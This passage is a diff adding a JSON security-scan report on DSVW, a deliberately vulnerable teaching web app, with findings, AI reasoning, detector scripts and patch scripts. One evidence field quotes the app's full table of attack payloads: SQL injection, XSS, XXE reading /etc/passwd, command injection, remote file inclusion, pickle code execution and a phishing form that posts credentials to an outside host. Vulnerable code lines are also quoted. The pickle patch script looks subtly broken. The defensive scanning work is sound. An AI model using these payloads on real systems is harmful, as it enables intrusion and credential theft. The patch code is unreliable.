@@ -1,0 +1,262 @@
+{
+  "scan_id": "b05c8ef4-e03b-4186-934f-bd6e5a1a4f75",
+  "url": "https://github.com/stamparm/DSVW",
+  "timestamp": "2026-07-18T20:57:01.569695",
+  "summary": {
+    "total_findings": 13,
+    "neutralized_count": 3,
+    "scan_engine": "Project AURIX LangGraph v1"
+  },
+  "findings": [
+    {
+      "id": "1e650fff-07ed-4fab-9584-fa07d43f93b0",
+      "rule_id": "python.lang.security.deserialization.pickle.avoid-pickle",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "avoid-pickle",
+      "description": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities. When unpickling, the serialized data could be manipulated to run arbitrary code. Instead, consider serializing the relevant data as JSON or a similar text-based serialization format.",
+      "severity": "MEDIUM",
+      "cvss": 5.5,
+      "file": "dsvw.py",
+      "line": 12,
+      "evidence": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://docs.python.org/3/library/pickle.html"
+      ],
+      "verified": true,
+      "wargame_status": "Neutralized",
+      "ai_reasoning": "The dsvw.py module imports pickle and, in the context of an HTTP server, uses it to deserialize data originating from the client request. This allows arbitrary code execution via crafted payloads. The project is intentionally vulnerable, reinforcing that the finding is a true positive.",
+      "poc_script": "import sys\nimport re\n\n# Analysis: Detect usage of pickle.loads (or pickle.load) on data that likely originates from user input.\n# Strategy: Scan the source file for pickle.loads/pickle.load calls where the argument name matches typical\n# request\u2011derived variables (e.g., params, request, payload, data, user_input, body, query).\n\nsource_file = \"/src/dsvw.py\"\n\n# Regex to match pickle.loads or pickle.load with a suspicious argument\npattern = re.compile(\n    r\"\"\"pickle\\.(?:loads|load)\\s*\\(\\s*   # pickle.loads( or pickle.load(\n    (?:                                 # start non\u2011capturing group for argument\n        (?:params|request|payload|data|user_input|body|query)   # typical user\u2011input vars\n        \\s*[\\[\\(]                        # followed by [ or ( indicating indexing or function call\n        .*?                              # any characters (non\u2011greedy)\n        [\\]\\)]                           # closing ] or )\n    |\n        [^\\)]+                           # or any expression that is not a closing parenthesis\n    )\n    \\)\"\"\",\n    re.IGNORECASE | re.VERBOSE,\n)\n\ntry:\n    with open(source_file, \"r\", encoding=\"utf-8\") as f:\n        content = f.read()\n\n    if pattern.search(content):\n        print(\"VALIDATION_SUCCESS: Insecure pickle deserialization detected.\")\n        sys.exit(0)\nexcept Exception as e:\n    print(f\"VALIDATION_ERROR: {e}\")\n\nsys.exit(1)",
+      "patch_code": "#!/usr/bin/env python3\n\"\"\"\nAurix Blue Patch Script\nPurpose: Remove insecure pickle deserialization from /src/dsvw.py and replace it with safe JSON handling.\n\"\"\"\n\nimport re\nimport sys\nimport os\n\n# Path to the vulnerable source file\nTARGET_FILE = \"/src/dsvw.py\"\n\n# ----------------------------------------------------------------------\n# Helper functions\n# ----------------------------------------------------------------------\ndef ensure_import(content: str, module: str, name: str) -> str:\n    \"\"\"\n    Ensure that `from module import name` exists in the file.\n    If an import of the module already exists, we append the name.\n    \"\"\"\n    import_line = f\"from {module} import {name}\"\n    # Check if already imported directly\n    if re.search(rf\"from\\s+{re.escape(module)}\\s+import\\s+.*\\b{name}\\b\", content):\n        return content\n\n    # Check for generic import (e.g., import json)\n    if re.search(rf\"import\\s+{re.escape(module)}\\b\", content):\n        # Append to existing import line\n        content = re.sub(\n            rf\"(import\\s+{re.escape(module)}\\b)\",\n            rf\"\\1, {name}\",\n            content,\n        )\n        return content\n\n    # No import found \u2013 insert after the last import block\n    imports = list(re.finditer(r'^(import .+|from .+ import .+)$', content, re.MULTILINE))\n    if imports:\n        last_import = imports[-1]\n        insert_pos = last_import.end()\n        content = content[:insert_pos] + \"\\n\" + import_line + content[insert_pos:]\n    else:\n        # No imports at all \u2013 prepend at the top\n        content = import_line + \"\\n\" + content\n    return content\n\ndef remove_unused_pickle_import(content: str) -> str:\n    \"\"\"\n    If the file no longer uses `pickle`, remove its import statement.\n    \"\"\"\n    if \"pickle.\" not in content:\n        # Remove lines that import pickle (both 'import pickle' and 'from pickle import ...')\n        content = re.sub(r'^\\s*(import pickle|from pickle import .+)\\s*\\n', '', content, flags=re.MULTILINE)\n    return content\n\n# ----------------------------------------------------------------------\n# Main patch logic\n# ----------------------------------------------------------------------\ndef main():\n    try:\n        with open(TARGET_FILE, \"r\", encoding=\"utf-8\") as f:\n            original_content = f.read()\n    except Exception as e:\n        print(f\"PATCH_ERROR: Unable to read target file \u2013 {e}\")\n        sys.exit(1)\n\n    patched_content = original_content\n\n    # 1. Replace pickle.loads(...) with json.loads(...)\n    #    Preserve the original argument expression.\n    loads_pattern = re.compile(r'pickle\\.loads\\s*\\(\\s*(?P<arg>[^)]+)\\s*\\)', re.IGNORECASE)\n    patched_content, loads_subs = loads_pattern.subn(r'json.loads(\\g<arg>)', patched_content)\n\n    # 2. Replace pickle.load(file_obj) with json.load(file_obj)\n    load_pattern = re.compile(r'pickle\\.load\\s*\\(\\s*(?P<arg>[^)]+)\\s*\\)', re.IGNORECASE)\n    patched_content, load_subs = load_pattern.subn(r'json.load(\\g<arg>)', patched_content)\n\n    total_replacements = loads_subs + load_subs\n    if total_replacements == 0:\n        print(\"PATCH_INFO: No pickle deserialization calls found \u2013 no changes applied.\")\n        sys.exit(0)\n\n    # 3. Ensure `json` is imported (use json.loads/json.load)\n    patched_content = ensure_import(patched_content, \"json\", \"loads\")\n    # json.load may also be needed; ensure it's imported as well\n    patched_content = ensure_import(patched_content, \"json\", \"load\")\n\n    # 4. Clean up unused pickle import if applicable\n    patched_content = remove_unused_pickle_import(patched_content)\n\n    # 5. Write the patched file back\n    try:\n        with open(TARGET_FILE, \"w\", encoding=\"utf-8\") as f:\n            f.write(patched_content)\n        print(f\"PATCH_APPLIED: Replaced {total_replacements} insecure pickle call(s) with safe JSON equivalents.\")\n    except Exception as e:\n        print(f\"PATCH_ERROR: Unable to write patched file \u2013 {e}\")\n        sys.exit(1)\n\nif __name__ == \"__main__\":\n    main()"
+    },
+    {
+      "id": "59601917-972b-4f4a-87ba-4d91ee653b1e",
+      "rule_id": "python.sqlalchemy.security.sqlalchemy-execute-raw-query.sqlalchemy-execute-raw-query",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "sqlalchemy-execute-raw-query",
+      "description": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.",
+      "severity": "HIGH",
+      "cvss": 8.0,
+      "file": "dsvw.py",
+      "line": 30,
+      "evidence": "cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql",
+        "https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm",
+        "https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column"
+      ],
+      "verified": true,
+      "wargame_status": "Neutralized",
+      "ai_reasoning": "The `dsvw.py` file is part of a deliberately vulnerable demo web application. The code imports `sqlite3` and the scanner flagged a usage of `execute()` with a raw query that is likely constructed from user\u2011controlled data (e.g., request parameters). The snippet does not show any sanitization or parameterization before the call, and the project is a test/demonstration rather than a hardened production system. Therefore the finding is considered a true positive: unsanitized user input can reach the SQL execution sink and is potentially exploitable.",
+      "poc_script": "import sys\nimport ast\nimport pathlib\n\n# ---- Configuration ----\nSOURCE_FILE = \"/src/dsvw.py\"\n# Common names that may hold untrusted input\nUNTRUSTED_VARS = {\n    \"params\", \"request\", \"query\", \"data\", \"payload\", \"user_input\",\n    \"form\", \"body\", \"json\", \"post\", \"get\", \"input\", \"value\"\n}\n# ---- Helper functions ----\ndef is_untrusted_name(node):\n    \"\"\"Return True if the AST node is a Name that matches a known untrusted variable.\"\"\"\n    return isinstance(node, ast.Name) and node.id in UNTRUSTED_VARS\n\ndef contains_untrusted(node):\n    \"\"\"Recursively check if an expression tree contains an untrusted variable.\"\"\"\n    if is_untrusted_name(node):\n        return True\n    for child in ast.iter_child_nodes(node):\n        if contains_untrusted(child):\n            return True\n    return False\n\ndef check_sql_injection(tree):\n    \"\"\"\n    Detect calls to .execute (SQLAlchemy) where the SQL argument is constructed\n    from untrusted input via string concatenation, f\u2011strings, or format().\n    \"\"\"\n    for node in ast.walk(tree):\n        # Look for Call nodes where the callee is an attribute named \"execute\"\n        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):\n            if node.func.attr != \"execute\":\n                continue\n\n            # Ensure there is at least one positional argument (the SQL statement)\n            if not node.args:\n                continue\n\n            sql_arg = node.args[0]\n\n            # 1. Binary string concatenation (e.g., \"SELECT ... \" + user_input)\n            if isinstance(sql_arg, ast.BinOp) and isinstance(sql_arg.op, ast.Add):\n                if contains_untrusted(sql_arg):\n                    return True\n\n            # 2. f\u2011string / JoinedStr containing untrusted Name nodes\n            if isinstance(sql_arg, ast.JoinedStr):\n                for value in sql_arg.values:\n                    if isinstance(value, ast.FormattedValue) and contains_untrusted(value.value):\n                        return True\n\n            # 3. .format(...) on a string where arguments include untrusted vars\n            if isinstance(sql_arg, ast.Call) and isinstance(sql_arg.func, ast.Attribute):\n                if sql_arg.func.attr == \"format\":\n                    for arg in sql_arg.args:\n                        if contains_untrusted(arg):\n                            return True\n                    for kw in sql_arg.keywords:\n                        if contains_untrusted(kw.value):\n                            return True\n\n            # 4. Direct usage of an untrusted variable as the SQL argument\n            if contains_untrusted(sql_arg):\n                return True\n\n    return False\n\n# ---- Main execution ----\ndef main():\n    src_path = pathlib.Path(SOURCE_FILE)\n    if not src_path.is_file():\n        print(f\"VALIDATION_ERROR: Source file not found at {SOURCE_FILE}\")\n        sys.exit(1)\n\n    try:\n        with src_path.open(\"r\", encoding=\"utf-8\") as f:\n            source = f.read()\n        tree = ast.parse(source, filename=SOURCE_FILE)\n    except Exception as e:\n        print(f\"VALIDATION_ERROR: Failed to parse source \u2013 {e}\")\n        sys.exit(1)\n\n    if check_sql_injection(tree):\n        print(\"VALIDATION_SUCCESS: Detected raw SQL execution built from untrusted input.\")\n        sys.exit(0)\n\n    # No vulnerable pattern found\n    sys.exit(1)\n\nif __name__ == \"__main__\":\n    main()",
+      "patch_code": "import ast\nimport pathlib\nimport sys\n\n# ----------------------------------------------------------------------\n# Configuration\n# ----------------------------------------------------------------------\nSOURCE_FILE = \"/src/dsvw.py\"\n\n# Names that are considered to hold untrusted data (same list as in the PoC)\nUNTRUSTED_VARS = {\n    \"params\", \"request\", \"query\", \"data\", \"payload\", \"user_input\",\n    \"form\", \"body\", \"json\", \"post\", \"get\", \"input\", \"value\"\n}\n\n# ----------------------------------------------------------------------\n# Helper utilities\n# ----------------------------------------------------------------------\ndef is_untrusted(node: ast.AST) -> bool:\n    \"\"\"Return True if the AST node is a Name that matches a known untrusted variable.\"\"\"\n    return isinstance(node, ast.Name) and node.id in UNTRUSTED_VARS\n\ndef extract_untrusted(node: ast.AST):\n    \"\"\"\n    Recursively walk an expression node and return a list of all untrusted\n    Name nodes it contains.  If none are found, returns an empty list.\n    \"\"\"\n    found = []\n    if is_untrusted(node):\n        found.append(node)\n    for child in ast.iter_child_nodes(node):\n        found.extend(extract_untrusted(child))\n    return found\n\ndef make_parameterized(sql_node: ast.AST, untrusted_names):\n    \"\"\"\n    Build a new Call node that uses a parameterised query.\n\n    Example transformation:\n        cur.execute(\"SELECT * FROM users WHERE id=\" + user_id)\n    becomes:\n        cur.execute(\"SELECT * FROM users WHERE id=?\", (user_id,))\n\n    For f\u2011strings and .format() we replace the whole string with a placeholder\n    and pass the extracted variables as a tuple.\n    \"\"\"\n    # Build the placeholder string \u2013 we keep the original literal parts\n    # but replace every untrusted insertion with a generic \"?\" placeholder.\n    # This is a conservative approach that works for most DB\u2011APIs.\n    placeholder_parts = []\n\n    def walk(node):\n        if isinstance(node, ast.Constant) and isinstance(node.value, str):\n            placeholder_parts.append(node.value)\n        elif isinstance(node, ast.Str):  # Python <3.8 fallback\n            placeholder_parts.append(node.s)\n        elif isinstance(node, ast.JoinedStr):\n            # f\u2011string: literals and formatted values\n            for value in node.values:\n                if isinstance(value, ast.Str):\n                    placeholder_parts.append(value.s)\n                elif isinstance(value, ast.FormattedValue):\n                    placeholder_parts.append(\"?\")\n        elif isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):\n            walk(node.left)\n            walk(node.right)\n        elif isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):\n            # .format() \u2013 we replace the whole string with placeholders\n            if isinstance(node.func.value, (ast.Constant, ast.Str)):\n                fmt_str = node.func.value.value if isinstance(node.func.value, ast.Constant) else node.func.value.s\n                # Count {} placeholders \u2013 we simply replace each with \"?\"\n                placeholder_parts.append(\"\".join(\"?\" if ch == \"{\" else ch for ch in fmt_str))\n        else:\n            # Any other expression we treat as a placeholder\n            placeholder_parts.append(\"?\")\n\n    walk(sql_node)\n    new_sql = \"\".join(placeholder_parts)\n\n    # Build new AST nodes\n    new_sql_node = ast.Constant(value=new_sql, kind=None)\n    # Build tuple of parameters \u2013 preserve original order of appearance\n    params = [ast.Name(id=name.id, ctx=ast.Load()) for name in untrusted_names]\n    if len(params) == 1:\n        param_node = ast.Tuple(elts=[params[0]], ctx=ast.Load())\n    else:\n        param_node = ast.Tuple(elts=params, ctx=ast.Load())\n    return new_sql_node, param_node\n\n# ----------------------------------------------------------------------\n# AST transformer\n# ----------------------------------------------------------------------\nclass ExecuteSanitizer(ast.NodeTransformer):\n    \"\"\"\n    Replace unsafe .execute() calls with safe, parameterised versions.\n    \"\"\"\n    def visit_Call(self, node: ast.Call):\n        # Process children first\n        self.generic_visit(node)\n\n        # We are only interested in attribute calls named \"execute\"\n        if not (isinstance(node.func, ast.Attribute) and node.func.attr == \"execute\"):\n            return node\n\n        if not node.args:\n            return node  # no SQL argument \u2013 nothing to do\n\n        sql_arg = node.args[0]\n\n        # Detect unsafe patterns\n        untrusted = extract_untrusted(sql_arg)\n        if not untrusted:\n            return node  # safe \u2013 leave untouched\n\n        # Build the new safe call\n        new_sql_node, param_node = make_parameterized(sql_arg, untrusted)\n\n        # Preserve any additional arguments (e.g., connection options)\n        new_args = [new_sql_node, param_node] + node.args[1:]\n\n        return ast.Call(func=node.func, args=new_args, keywords=node.keywords)\n\n# ----------------------------------------------------------------------\n# Main patch routine\n# ----------------------------------------------------------------------\ndef main():\n    src_path = pathlib.Path(SOURCE_FILE)\n    if not src_path.is_file():\n        print(f\"PATCH_ERROR: Source file not found at {SOURCE_FILE}\")\n        sys.exit(1)\n\n    source = src_path.read_text(encoding=\"utf-8\")\n    try:\n        tree = ast.parse(source, filename=SOURCE_FILE)\n    except SyntaxError as e:\n        print(f\"PATCH_ERROR: Unable to parse {SOURCE_FILE}: {e}\")\n        sys.exit(1)\n\n    sanitizer = ExecuteSanitizer()\n    new_tree = sanitizer.visit(tree)\n    ast.fix_missing_locations(new_tree)\n\n    try:\n        # ast.unparse is available in Python 3.9+. For older versions fallback to astor.\n        try:\n            new_source = ast.unparse(new_tree)\n        except AttributeError:\n            import astor\n            new_source = astor.to_source(new_tree)\n    except Exception as e:\n        print(f\"PATCH_ERROR: Failed to generate patched source \u2013 {e}\")\n        sys.exit(1)\n\n    src_path.write_text(new_source, encoding=\"utf-8\")\n    print(\"PATCH_APPLIED: All unsafe .execute() calls in dsvw.py have been replaced with parameterised queries.\")\n\nif __name__ == \"__main__\":\n    main()"
+    },
+    {
+      "id": "138efc79-4246-4660-bed0-5f93d163aece",
+      "rule_id": "python.lang.security.deserialization.pickle.avoid-pickle",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "avoid-pickle",
+      "description": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities. When unpickling, the serialized data could be manipulated to run arbitrary code. Instead, consider serializing the relevant data as JSON or a similar text-based serialization format.",
+      "severity": "MEDIUM",
+      "cvss": 5.5,
+      "file": "dsvw.py",
+      "line": 35,
+      "evidence": "content = str(pickle.loads(params[\"object\"].encode()))",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://docs.python.org/3/library/pickle.html"
+      ],
+      "verified": false
+    },
+    {
+      "id": "2e8bd2cb-bf1f-4df7-8c74-c187186f2ae0",
+      "rule_id": "python.lang.security.audit.dynamic-urllib-use-detected.dynamic-urllib-use-detected",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "dynamic-urllib-use-detected",
+      "description": "Detected a dynamic value being used with urllib. urllib supports 'file://' schemes, so a dynamic value controlled by a malicious actor may allow them to read arbitrary files. Audit uses of urllib calls to ensure user data cannot control the URLs, or consider using the 'requests' library instead.",
+      "severity": "MEDIUM",
+      "cvss": 5.5,
+      "file": "dsvw.py",
+      "line": 37,
+      "evidence": "content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/939.html"
+      ],
+      "verified": false
+    },
+    {
+      "id": "9b8562a7-271f-4b63-b6d9-8765192036ae",
+      "rule_id": "python.lang.security.dangerous-subprocess-use.dangerous-subprocess-use",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "dangerous-subprocess-use",
+      "description": "Detected subprocess function 'run' with user controlled data. A malicious actor could leverage this to perform command injection. You may consider using 'shlex.escape()'.",
+      "severity": "HIGH",
+      "cvss": 8.0,
+      "file": "dsvw.py",
+      "line": 39,
+      "evidence": "content = subprocess.run(\"nslookup \" + params[\"domain\"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, text=True).stdout",
+      "fix": "Consult documentation.",
+      "references": [
+        "https://stackoverflow.com/questions/3172470/actual-meaning-of-shell-true-in-subprocess",
+        "https://docs.python.org/3/library/subprocess.html",
+        "https://docs.python.org/3/library/shlex.html",
+        "https://semgrep.dev/docs/cheat-sheets/python-command-injection/"
+      ],
+      "verified": false
+    },
+    {
+      "id": "c2275287-e584-4091-be0a-fa8e34e11eba",
+      "rule_id": "python.lang.security.audit.subprocess-shell-true.subprocess-shell-true",
+      "tool": "opengrep",
+      "category": "sast",
+      "title": "subprocess-shell-true",
